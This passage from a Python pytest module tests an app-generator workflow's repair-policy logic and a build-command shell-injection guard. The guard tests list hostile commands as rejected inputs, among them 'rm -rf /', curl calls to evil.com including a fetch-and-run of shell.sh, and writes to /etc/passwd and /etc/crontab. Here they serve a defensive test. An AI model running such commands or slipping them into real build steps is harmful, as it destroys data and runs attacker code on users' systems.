    assert repeated["bundle_repair"]["failure_fingerprint"] == first["bundle_repair"]["failure_fingerprint"]
    assert repeated["bundle_repair"]["attempt"] == 1
    assert context.get("bundle_repair_no_progress") is True
    assert context.get("bundle_repair_target") is None


def test_bundle_repair_allows_changed_failure_within_budget() -> None:
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    first_error = "modules/support/backend/token_wallet_ledger.py: forbidden helper"
    changed_error = "modules/support/backend/provider_client.py: raw provider secret key literal"
    context = _Context()
    _accept_tasks(context, {}, {
        "services": ("ServiceAgent", [
            "modules/support/backend/token_wallet_ledger.py", "modules/support/backend/provider_client.py",
        ]),
    })
    first = prepare_bundle_repair(
        {"passed": False, "errors": [first_error]}, context,
    )
    _repair_responded(context)
    result = prepare_bundle_repair(
        {"passed": False, "errors": [changed_error]},
        context,
    )

    assert result["status"] == "needs_revision"
    assert result["no_progress"] is False
    assert result["attempt"] == 2
    assert result["failure_fingerprint"] != first["failure_fingerprint"]
    assert context.get("bundle_repair_target") == "ServiceAgent"


@pytest.mark.asyncio
async def test_workflow_integration_repair_blocks_identical_no_progress_failure() -> None:
    module = importlib.import_module("factory_app.workflows.AppGenerator.tools.app_validation")
    from scripts.smoke_appgenerator_live_acceptance import (
        build_appgenerator_acceptance_files,
        default_workflow_integration,
    )

    integration = default_workflow_integration()
    files = build_appgenerator_acceptance_files(integration)
    del files["modules/support_tickets/contracts/reactions.yaml"]
    context = _Context(
        {
            "generated_files": files,
            "generated_workflow_name": integration["workflow_name"],
            "generated_workflow_capability_id": integration["capability_id"],
            "generated_workflow_startup_mode": integration["startup_mode"],
            "generated_workflow_trigger_events": integration["trigger_events"],
        }
    )

    _accept_support_tasks(context, files)
    first = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)
    _repair_responded(context)
    repeated = await module.run_app_bundle_acceptance_gate(files=files, context_variables=context)

    assert first["bundle_repair"]["status"] == "needs_revision"
    assert repeated["bundle_repair"]["status"] == "blocked"
    assert repeated["bundle_repair"]["no_progress"] is True
    assert (
        repeated["bundle_repair"]["failure_fingerprint"]
        == first["bundle_repair"]["failure_fingerprint"]
    )
    assert repeated["bundle_repair"]["attempt"] == 1
    assert context.get("bundle_repair_no_progress") is True


def test_workflow_integration_fingerprint_ignores_failed_test_order() -> None:
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    failed_tests = [
        {"test": "event", "path": "modules/a/contracts/events.yaml", "error": "missing event"},
        {"test": "reaction", "path": "modules/a/contracts/reactions.yaml", "error": "missing reaction"},
    ]
    context = _Context({})
    _accept_tasks(context, {}, {
        "contracts": ("ConfigMiddlewareAgent", [item["path"] for item in failed_tests]),
    })

    first = prepare_bundle_repair(
        {"passed": False, "diagnostics": failed_tests},
        context,
    )
    _repair_responded(context)
    repeated = prepare_bundle_repair(
        {"passed": False, "diagnostics": list(reversed(failed_tests))},
        context,
    )

    assert first["status"] == "needs_revision"
    assert repeated["status"] == "blocked"
    assert repeated["no_progress"] is True
    assert repeated["failure_fingerprint"] == first["failure_fingerprint"]


@pytest.mark.parametrize("first_status", ["responded", "rejected", "selected"])
def test_independent_owned_repair_can_use_budget_after_another_target_blocks(first_status):
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    context = _Context()
    models = "modules/support/backend/schemas.py"
    service = "modules/support/backend/handler.py"
    _accept_tasks(context, {}, {
        "a_models": ("ModelAgent", [models]),
        "b_services": ("ServiceAgent", [service]),
    })
    failures = {"passed": False, "diagnostics": [
        {"path": models, "error": "Invalid model output"},
        {"path": service, "error": "Missing handler class"},
    ]}
    first = prepare_bundle_repair(failures, context)
    assert first["target_agent"] == "ModelAgent"
    assert first["active"]["allowed_paths"] == [models]
    assert first["attempt"] == 1
    state = context.get("bundle_repair_result")
    state["active"]["status"] = first_status
    context.set("bundle_repair_result", state)

    second = prepare_bundle_repair(failures, context)

    assert second["status"] == "needs_revision"
    assert second["target_agent"] == "ServiceAgent"
    assert second["active"]["allowed_paths"] == [service]
    assert second["attempt"] == 2
    assert second["history"][0]["status"] == (
        "interrupted" if first_status == "selected" else first_status
    )
    assert any(item.get("block_reason") for item in second["diagnostics"] if item["path"] == models)


def test_missing_accepted_task_evidence_blocks_an_apparently_repairable_file():
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    context = _Context()
    path = "modules/support/backend/handler.py"
    _accept_tasks(context, {}, {"services": ("ServiceAgent", [path])})
    context.set("app_task_batch_results", {})

    result = prepare_bundle_repair({"passed": False, "errors": [path + ": wrong class"]}, context)

    assert result["status"] == "blocked"
    assert result["attempt"] == 0
    assert result["diagnostics"][0]["block_reason"] == "missing_accepted_task_evidence"


@pytest.mark.parametrize("multiple_paths", [False, True])
def test_wildcard_diagnostic_requires_a_unique_approved_task_owner(multiple_paths):
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    context = _Context()
    paths = ["modules/support/contracts/reactions.yaml"]
    if multiple_paths:
        paths.append("modules/reports/contracts/reactions.yaml")
    _accept_tasks(context, {}, {"contracts": ("ConfigMiddlewareAgent", paths)})
    wildcard = "modules/*/contracts/reactions.yaml"

    result = prepare_bundle_repair({"passed": False, "diagnostics": [
        {"path": wildcard, "error": "Missing workflow trigger reaction"},
    ]}, context)

    assert result["status"] == "needs_revision"
    assert result["active"]["task_id"] == "contracts"
    assert result["active"]["allowed_paths"] == paths
    assert result["diagnostics"][0]["path"] == (wildcard if multiple_paths else paths[0])


def test_wildcard_diagnostic_cannot_choose_between_tasks_with_the_same_agent():
    from factory_app.workflows.AppGenerator.tools.repair_policy import prepare_bundle_repair

    context = _Context()
    _accept_tasks(context, {}, {
        "support_contract": ("ConfigMiddlewareAgent", ["modules/support/contracts/reactions.yaml"]),
        "reports_contract": ("ConfigMiddlewareAgent", ["modules/reports/contracts/reactions.yaml"]),
    })

    result = prepare_bundle_repair({"passed": False, "diagnostics": [
        {"path": "modules/*/contracts/reactions.yaml", "error": "Missing workflow trigger reaction"},
    ]}, context)

    assert result["status"] == "blocked"
    assert result["attempt"] == 0
    assert result["diagnostics"][0]["block_reason"] == "missing_or_ambiguous_owner"


def test_validate_wiring_tool_annotations_are_runtime_resolved() -> None:
    from factory_app.workflows.AppGenerator.tools.validate_wiring import validate_wiring

    assert validate_wiring.__annotations__["context_variables"] != "Optional[Dict[str, Any]]"


# ---------------------------------------------------------------------------
# _is_safe_build_command: shell injection guard
# ---------------------------------------------------------------------------

def test_is_safe_build_command_accepts_standard_build_commands() -> None:
    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command

    safe = [
        "npm install",
        "npm run build",
        "npm test -- --watchAll=false",
        "python -m pytest",
        "yarn build",
        "node scripts/build.js",
        "pip install -r requirements.txt",
    ]
    for cmd in safe:
        assert _is_safe_build_command(cmd), f"Expected safe, got rejected: {cmd!r}"


def test_is_safe_build_command_rejects_shell_metacharacters() -> None:
    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command

    dangerous = [
        "npm install; rm -rf /",
        "npm run build && curl http://evil.com",
        "npm test | tee /etc/passwd",
        "npm install || echo pwned",
        "`rm -rf /`",
        "$(curl http://evil.com/shell.sh)",
        "npm run build > /etc/crontab",
        "cat /etc/passwd < /dev/null",
        "npm install\x00; evil",
    ]
    for cmd in dangerous:
        assert not _is_safe_build_command(cmd), f"Expected rejected, got accepted: {cmd!r}"


def test_is_safe_build_command_rejects_empty_and_null() -> None:
    from factory_app.workflows.AppGenerator.tools.app_validation import _is_safe_build_command

    assert not _is_safe_build_command("")
    assert not _is_safe_build_command("\x00")

